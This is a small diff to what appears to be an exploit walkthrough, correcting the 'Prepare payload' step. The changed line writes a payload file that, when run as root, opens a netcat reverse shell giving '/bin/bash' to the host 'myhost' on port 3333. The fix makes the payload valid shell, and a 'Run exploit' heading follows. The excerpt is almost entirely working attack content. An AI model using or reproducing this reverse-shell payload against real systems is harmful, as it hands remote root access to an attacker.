@@ -31,7 +31,7 @@
 
 ## Prepare payload
 ```
-echo "if [ `id -u` -eq 0 ]; /bin/nc -e /bin/bash myhost 3333 &; fi" > payloadfile
+echo "if [ `id -u` -eq 0 ]; then (/bin/nc -e /bin/bash myhost 3333 &); fi" > payloadfile
 ```
 
 ## Run exploit
